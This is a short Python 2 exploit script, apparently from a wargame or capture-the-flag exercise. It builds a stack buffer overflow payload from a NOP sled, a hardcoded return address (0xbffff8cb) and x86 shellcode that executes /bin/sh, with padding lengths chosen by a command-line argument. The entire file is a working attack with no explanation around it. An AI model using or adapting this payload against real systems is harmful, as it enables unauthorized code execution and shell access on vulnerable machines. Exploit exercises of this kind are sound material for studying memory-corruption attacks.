import struct
import sys

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

eip = struct.pack('I', 0xbffff8cb)

if len(sys.argv) > 1 and sys.argv[1] == 'nl':
    print "\x90" * 0x28 + " " + "\x90" * (0x20 - (13 - 4)) + eip + "\x90" * 100 + shellcode
elif len(sys.argv) > 1 and sys.argv[1] == 'fi':
    print "\x90" * 0x28 + " " + "\x90" * (0x20 - (18 - 4)) + eip + "\x90" * 100 + shellcode
